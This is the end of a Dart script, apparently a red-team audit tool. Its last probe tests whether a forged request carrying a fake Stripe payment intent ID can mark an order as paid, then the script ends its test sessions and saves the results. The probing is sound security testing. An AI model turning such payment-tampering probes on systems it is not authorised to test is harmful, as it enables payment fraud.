    probe('AG8-jwt-stamp-pi', 'AG8', {
      'http': fakePi['http'],
      'body': fakePi['body'],
      'after': afterStamp,
      'open': '${afterStamp['stripe_payment_intent_id']}' == 'pi_fake_rtag' ||
          asInt(afterStamp['amount_paid_cents']) >= 9999 ||
          '${afterStamp['status']}' == 'pago',
    });
  }

  // Cleanup lives we created
  for (final id in [
    liveAId,
    gLive,
    liveOnly['liveId'],
    liveSold['liveId'],
    liveMove['liveId'],
    liveS2['liveId'],
    liveRace['liveId'],
  ]) {
    await endLive(id);
  }

  final outDir = Directory('tool/redteam_blind_ag_20260901T1916');
  await outDir.create(recursive: true);
  final outFile = File('${outDir.path}/probes.json');
  await outFile.writeAsString(
    const JsonEncoder.withIndent('  ').convert({
      'auditor': 'REDTEAM_BLIND_AG_LIVE_POS_ABACAD_v1',
      'prefix': prefix,
      'helper_id': helperId,
      'seller2_id': seller2Id,
      'probes': probes,
    }),
  );
  print('WROTE ${outFile.path} n=${probes.length}');
}
